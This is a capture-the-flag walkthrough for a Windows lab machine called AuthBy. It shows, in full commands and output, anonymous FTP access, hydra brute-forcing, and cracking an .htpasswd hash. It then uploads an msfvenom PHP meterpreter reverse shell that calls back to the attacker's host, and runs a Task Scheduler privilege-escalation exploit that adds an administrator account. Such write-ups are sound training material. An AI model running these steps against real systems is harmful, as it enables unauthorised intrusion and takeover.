_____

# Exploitation Guide for AuthBy

## Summary

We will initially exploit this machine through Anonymous FTP. After logging in as the anonymous FTP user, we will deduce the password of the admin FTP account. We'll then use this account to discover additional system credentials which we'll use to trigger our uploaded reverse shell. Finally, we'LL escalate with a local privilege escalation exploit.

## Enumeration

### Nmap

We'll begin with an `nmap` scan.

```
kali@kali:~$ sudo nmap -p- 192.168.68.46
Starting Nmap 7.80 ( https://nmap.org ) at 2020-12-27 17:32 UTC
Nmap scan report for 192.168.68.46
Host is up (0.031s latency).
Not shown: 65531 filtered ports
PORT     STATE SERVICE
21/tcp   open  ftp
242/tcp  open  direct
3145/tcp open  csi-lfap
3389/tcp open  ms-wbt-server
```

Next, we'll launch an aggressive scan against the discovered open ports.

```
kali@kali:~$ sudo nmap -A -sV -p 21,242,3145,3389 192.168.68.46
Starting Nmap 7.80 ( https://nmap.org ) at 2020-12-27 17:37 UTC
Nmap scan report for 192.168.68.46
Host is up (0.037s latency).

PORT     STATE SERVICE            VERSION
21/tcp   open  ftp                zFTPServer 6.0 build 2011-10-17
| ftp-anon: Anonymous FTP login allowed (FTP code 230)
| total 9680
| ----------   1 root     root      5610496 Oct 18  2011 zFTPServer.exe
| ----------   1 root     root           25 Feb 10  2011 UninstallService.bat
| ----------   1 root     root      4284928 Oct 18  2011 Uninstall.exe
| ----------   1 root     root           17 Aug 13  2011 StopService.bat
| ----------   1 root     root           18 Aug 13  2011 StartService.bat
| ----------   1 root     root         8736 Nov 09  2011 Settings.ini
| dr-xr-xr-x   1 root     root          512 Dec 28 01:37 log
| ----------   1 root     root         2275 Aug 09  2011 LICENSE.htm
| ----------   1 root     root           23 Feb 10  2011 InstallService.bat
| dr-xr-xr-x   1 root     root          512 Nov 08  2011 extensions
| dr-xr-xr-x   1 root     root          512 Nov 08  2011 certificates
|_dr-xr-xr-x   1 root     root          512 Aug 13 04:13 accounts
242/tcp  open  http               Apache httpd 2.2.21 ((Win32) PHP/5.3.8)
| http-auth: 
| HTTP/1.1 401 Authorization Required\x0D
|_  Basic realm=Qui e nuce nuculeum esse volt, frangit nucem!
|_http-server-header: Apache/2.2.21 (Win32) PHP/5.3.8
|_http-title: 401 Authorization Required
3145/tcp open  zftp-admin         zFTPServer admin
3389/tcp open  ssl/ms-wbt-server?
| rdp-ntlm-info: 
|   Target_Name: LIVDA
|   NetBIOS_Domain_Name: LIVDA
|   NetBIOS_Computer_Name: LIVDA
|   DNS_Domain_Name: LIVDA
|   DNS_Computer_Name: LIVDA
|   Product_Version: 6.0.6001
|_  System_Time: 2020-12-27T17:38:21+00:00
| ssl-cert: Subject: commonName=LIVDA
| Not valid before: 2020-03-23T12:57:25
|_Not valid after:  2020-09-22T12:57:25
|_ssl-date: 2020-12-27T17:38:26+00:00; 0s from scanner time.
Warning: OSScan results may be unreliable because we could not find at least 1 open and 1 closed port
Aggressive OS guesses: Microsoft Windows Server 2012 R2 (93%), Microsoft Windows Server 2008 R2 (91%), Microsoft Windows Server 2008 R2 SP1 or Windows 8 (91%), Microsoft Windows 7 Professional or Windows 8 (91%), Microsoft Windows 7 SP1 or Windows Server 2008 SP2 or 2008 R2 SP1 (91%), Microsoft Windows Vista SP0 or SP1, Windows Server 2008 SP1, or Windows 7 (91%), Microsoft Windows Vista SP2 (91%), Microsoft Windows Vista SP2, Windows 7 SP1, or Windows Server 2008 (90%), Microsoft Windows 8.1 Update 1 (90%), Microsoft Windows Phone 7.5 or 8.0 (90%)
No exact OS matches for host (test conditions non-ideal).
Network Distance: 2 hops
Service Info: OS: Windows; CPE: cpe:/o:microsoft:windows
```

The results indicate that the FTP server allows anonymous authentication. In addition, an Apache web server is running on port 242.

### FTP Enumeration

Since FTP appears to be wide-open, let's log in as the `anonymous` user and enumerate available files and directories.

```
kali@kali:~$ ftp 192.168.68.46
Connected to 192.168.68.46.
220 zFTPServer v6.0, build 2011-10-17 14:25 ready.
Name (192.168.68.46:kali): anonymous
331 User name received, need password.
Password:
230 User logged in, proceed.
Remote system type is UNIX.
Using binary mode to transfer files.
ftp> dir
200 PORT Command successful.
150 Opening connection for /bin/ls.
total 9680
----------   1 root     root      5610496 Oct 18  2011 zFTPServer.exe
----------   1 root     root           25 Feb 10  2011 UninstallService.bat
----------   1 root     root      4284928 Oct 18  2011 Uninstall.exe
----------   1 root     root           17 Aug 13  2011 StopService.bat
----------   1 root     root           18 Aug 13  2011 StartService.bat
----------   1 root     root         8736 Nov 09  2011 Settings.ini
dr-xr-xr-x   1 root     root          512 Dec 28 01:37 log
----------   1 root     root         2275 Aug 09  2011 LICENSE.htm
----------   1 root     root           23 Feb 10  2011 InstallService.bat
dr-xr-xr-x   1 root     root          512 Nov 08  2011 extensions
dr-xr-xr-x   1 root     root          512 Nov 08  2011 certificates
dr-xr-xr-x   1 root     root          512 Aug 13 04:13 accounts
226 Closing data connection.
ftp>
```

The **accounts** directory looks interesting and is worth exploring.

```
ftp> cd accounts
250 CWD Command successful.
ftp> dir
200 PORT Command successful.
150 Opening connection for /bin/ls.
total 4
dr-xr-xr-x   1 root     root          512 Aug 13 04:13 backup
----------   1 root     root          764 Aug 13 04:13 acc[Offsec].uac
----------   1 root     root         1030 Dec 28 01:38 acc[anonymous].uac
----------   1 root     root          926 Aug 13 04:13 acc[admin].uac
226 Closing data connection.
ftp> exit
221 Goodbye.
kali@kali:~$
```

This directory contains a UAC account file for the `admin` user.

## Exploitation

### FTP User Login Brute-Force

Let's brute-force the `admin` account with `hydra` and the **rockyou.txt** wordlist.

```
kali@kali:~$ hydra -l admin -P /usr/share/wordlists/rockyou.txt -e nsr -f ftp://192.168.68.46
Hydra v9.0 (c) 2019 by van Hauser/THC - Please do not use in military or secret service organizations, or for illegal purposes.

Hydra (https://github.com/vanhauser-thc/thc-hydra) starting at 2020-12-27 17:43:40
[DATA] max 16 tasks per 1 server, overall 16 tasks, 14344402 login tries (l:1/p:14344402), ~896526 tries per task
[DATA] attacking ftp://192.168.68.46:21/
[21][ftp] host: 192.168.68.46   login: admin   password: admin
[STATUS] attack finished for 192.168.68.46 (valid pair found)
1 of 1 target successfully completed, 1 valid password found
Hydra (https://github.com/vanhauser-thc/thc-hydra) finished at 2020-12-27 17:43:44
kali@kali:~$
```

This reveals that the password is `admin`.

### Further FTP Enumeration

We can now log in to FTP with the `admin:admin` credentials and enumerate further.

```
kali@kali:~$ ftp 192.168.68.46
Connected to 192.168.68.46.
220 zFTPServer v6.0, build 2011-10-17 14:25 ready.
Name (192.168.68.46:kali): admin
331 User name received, need password.
Password:
230 User logged in, proceed.
Remote system type is UNIX.
Using binary mode to transfer files.
ftp> dir
200 PORT Command successful.
150 Opening connection for /bin/ls.
total 3
-r--r--r--   1 root     root           76 Nov 08  2011 index.php
-r--r--r--   1 root     root           45 Nov 08  2011 .htpasswd
-r--r--r--   1 root     root          161 Nov 08  2011 .htaccess
226 Closing data connection.
ftp>
```

Inside this user's directory, we find three files: **index.php**, **.htpasswd**, and **.htaccess**. Let's download them to our attack machine for closer inspection.

```
ftp> get index.php
local: index.php remote: index.php
200 PORT Command successful.
150 File status okay; about to open data connection.
226 Closing data connection.
76 bytes received in 0.10 secs (0.7232 kB/s)
ftp> get .htpasswd
local: .htpasswd remote: .htpasswd
200 PORT Command successful.
150 File status okay; about to open data connection.
226 Closing data connection.
45 bytes received in 0.11 secs (0.4185 kB/s)
ftp> get .htaccess
local: .htaccess remote: .htaccess
200 PORT Command successful.
150 File status okay; about to open data connection.
226 Closing data connection.
161 bytes received in 0.10 secs (1.5832 kB/s)
ftp> bye
221 Goodbye.
kali@kali:~$
```

The **index.php** file doesn't contain anything of value.

The **.htpasswd** file contains a password hash for the `offsec` user.

```
kali@kali:~$ cat .htpasswd 
offsec:$apr1$oRfRsc/K$UpYpplHDlaemqseM39Ugg0
```

The **.htaccess** file indicates that the **.htpasswd** file is used for authentication.

```
kali@kali:~$ cat .htaccess
AuthName "Qui e nuce nuculeum esse volt, frangit nucem!"
AuthType Basic
AuthUserFile c:\\wamp\www\.htpasswd
<Limit GET POST PUT>
Require valid-user
</Limit>kali@kali:~$
```

This means that if we crack the hash, we can authenticate as the `offsec` user.

### Password Cracking

We can use `john` to attempt to crack the retrieved password hash.

```
kali@kali:~$ john .htpasswd --wordlist=/usr/share/wordlists/rockyou.txt
Warning: detected hash type "md5crypt", but the string is also recognized as "md5crypt-long"
Use the "--format=md5crypt-long" option to force loading these as that type instead
Using default input encoding: UTF-8
Loaded 1 password hash (md5crypt, crypt(3) $1$ (and variants) [MD5 256/256 AVX2 8x3])
Will run 4 OpenMP threads
Press 'q' or Ctrl-C to abort, almost any other key for status
elite            (offsec)
1g 0:00:00:00 DONE (2020-12-27 17:56) 8.333g/s 211200p/s 211200c/s 211200C/s 191192..260989
Use the "--show" option to display all of the cracked passwords reliably
Session completed
kali@kali:~$
```

We discover that the password for the `offsec` user is `elite`.

### PHP Reverse Shell

Since we discovered a PHP file on the server, it is reasonable to assume that the server can interpret and process PHP files. We can try to upload a PHP reverse shell. First, we'll generate the payload.

```
kali@kali:~$ msfvenom -p php/meterpreter/reverse_tcp -f raw lhost=192.168.49.68 lport=443 > pwn.php

[-] No platform was selected, choosing Msf::Module::Platform::PHP from the payload
[-] No arch selected, selecting arch: php from the payload
No encoder or badchars specified, outputting raw payload
Payload size: 1113 bytes
```

Next, we'll log back in to FTP as `admin` and upload the malicious PHP file.

```
kali@kali:~$ ftp 192.168.68.46
Connected to 192.168.68.46.
220 zFTPServer v6.0, build 2011-10-17 14:25 ready.
Name (192.168.68.46:kali): admin
331 User name received, need password.
Password:
230 User logged in, proceed.
Remote system type is UNIX.
Using binary mode to transfer files.
ftp> dir
200 PORT Command successful.
150 Opening connection for /bin/ls.
total 3
-r--r--r--   1 root     root           76 Nov 08  2011 index.php
-r--r--r--   1 root     root           45 Nov 08  2011 .htpasswd
-r--r--r--   1 root     root          161 Nov 08  2011 .htaccess
226 Closing data connection.
ftp> put pwn.php
local: pwn.php remote: pwn.php
200 PORT Command successful.
150 File status okay; about to open data connection.
226 Closing data connection.
1113 bytes sent in 0.00 secs (14.9499 MB/s)
ftp> dir
200 PORT Command successful.
150 Opening connection for /bin/ls.
total 5
-r--r--r--   1 root     root         1113 Dec 28 02:08 pwn.php
-r--r--r--   1 root     root           76 Nov 08  2011 index.php
-r--r--r--   1 root     root           45 Nov 08  2011 .htpasswd
-r--r--r--   1 root     root          161 Nov 08  2011 .htaccess
226 Closing data connection.
ftp> bye
221 Goodbye.
kali@kali:~$
```

Let's set up our meterpreter listener and trigger the reverse shell by connecting on port 242 with the recovered credentials of `offsec:elite`.

```
kali@kali:~$ msfconsole
...
msf5 > use exploit/multi/handler 
msf5 exploit(multi/handler) > set payload php/meterpreter/reverse_tcp
payload => php/meterpreter/reverse_tcp
msf5 exploit(multi/handler) > set LHOST 192.168.49.68
LHOST => 192.168.49.68
msf5 exploit(multi/handler) > set LPORT 443
LPORT => 443
msf5 exploit(multi/handler) > run

[*] Started reverse TCP handler on 192.168.49.68:443 
```

Now, we'll trigger our reverse shell.

```
kali@kali:~$ curl --user offsec:elite 192.168.68.46:242/pwn.php

```

The listener indicates that we have received our shell.

```
msf5 exploit(multi/handler) > run

[*] Started reverse TCP handler on 192.168.49.68:443 
[*] Sending stage (38288 bytes) to 192.168.68.46
[*] Meterpreter session 1 opened (192.168.49.68:443 -> 192.168.68.46:49167) at 2020-12-27 18:14:21 +0000

meterpreter > getuid
Server username: apache (0)
meterpreter >
```

## Escalation

### Local Enumeration

Next, we'll perform local enumeration in the hopes of escalating our privileges. We'll begin by enumerating the operating system version.

```
meterpreter > sysinfo 
Computer    : LIVDA
OS          : Windows NT LIVDA 6.0 build 6001 (Windows Server 2008 Standard Edition Service Pack 1) i586
Meterpreter : php/windows
meterpreter >

```

According to the Exploit Database, this machine is vulnerable to a [Task Scheduler Privilege Escalation](http://www.exploit-db.com/exploits/15589/) exploit.

```
kali@kali:~$ searchsploit ""Privilege Escalation"" | uniq | grep -v metasploit | grep -i ""windows ""
Fortinet FortiClient 5.2.3 (Windows 10 x64 Creators) - Local Privilege E | exploits/windows_x86-64/local/45149.cpp
Fortinet FortiClient 5.2.3 (Windows 10 x64 Post-Anniversary) - Local Pri | exploits/windows_x86-64/local/41722.c
Fortinet FortiClient 5.2.3 (Windows 10 x64 Pre-Anniversary) - Local Priv | exploits/windows_x86-64/local/41721.c
Fortinet FortiClient 5.2.3 (Windows 10 x86) - Local Privilege Escalation | exploits/windows_x86/local/41705.cpp

...

Microsoft Windows - Task Scheduler Privilege Escalation                  | exploits/windows/local/15589.wsf

...

Windows - NtUserSetWindowFNID Win32k User Callback Privilege Escalation  | exploits/windows/local/47134.rb
Windows - Shell COM Server Registrar Local Privilege Escalation          | exploits/windows/local/47880.cc
XAMPP for Windows 1.6.3a - Local Privilege Escalation                    | exploits/windows/local/4325.php
```

### Task Scheduler Privilege Escalation Exploit

Let's copy the exploit file to a directory on our attack machine.

```
kali@kali:~$ file /usr/share/exploitdb/exploits/windows/local/15589.wsf
/usr/share/exploitdb/exploits/windows/local/15589.wsf: HTML document, ASCII text, with CRLF line terminators

kali@kali:~$ cp /usr/share/exploitdb/exploits/windows/local/15589.wsf .
```

This exploit creates a new user (`test123`) with a matching password (`test123`) and adds the user to the `Administrators` group:

```
a.WriteLine (""net user /add test123 test123"")
a.WriteLine (""net localgroup administrators /add test123"")
```

Let's upload the exploit using our meterpreter session and then execute it on the target.

```
meterpreter > ls
Listing: C:\wamp\www
====================

Mode              Size  Type  Last modified              Name
----              ----  ----  -------------              ----
100666/rw-rw-rw-  161   fil   2011-11-08 15:58:11 +0000  .htaccess
100666/rw-rw-rw-  45    fil   2011-11-08 15:53:09 +0000  .htpasswd
100666/rw-rw-rw-  76    fil   2011-11-08 15:45:29 +0000  index.php
100666/rw-rw-rw-  1113  fil   2020-12-27 18:08:12 +0000  pwn.php

meterpreter > upload 15589.wsf /Users/apache/Desktop/
[*] uploading  : 15589.wsf -> /Users/apache/Desktop/
[*] uploaded   : 15589.wsf -> /Users/apache/Desktop/\15589.wsf
meterpreter > execute -f cscript -a C:/Users/apache/Desktop/15589.wsf
Process 2868 created.
meterpreter >
```

After the exploit has completed, we can connect to remote desktop with `test123:test123`.

```
kali@kali:~$ rdesktop 192.168.68.46 -u test123 -p test123
Autoselecting keyboard map 'en-us' from locale

ATTENTION! The server uses and invalid security certificate which can not be trusted for
the following identified reasons(s);

 1. Certificate issuer is not trusted by this system.

     Issuer: CN=LIVDA

 2. Certificate has expired.

     Valid to: Tue Sep 22 12:57:25 2020



Review the following certificate info before you trust it to be added as an exception.
If you do not trust the certificate the connection atempt will be aborted:

    Subject: CN=LIVDA
     Issuer: CN=LIVDA
 Valid From: Mon Mar 23 12:57:25 2020
         To: Tue Sep 22 12:57:25 2020

  Certificate fingerprints:

       sha1: 92f40781ed691eb1f4a5463fa1c7a36661dce8a0
     sha256: 3556cd6b7171d75fa2a737ceca4a69ba77583af6177683dbe099ad3dded93aa5


Do you trust this certificate (yes/no)? yes
Connection established using SSL.
Protocol(warning): process_pdu_logon(), Unhandled login infotype 1
```

If everything worked as expected, we have access to the system as a local administrator.
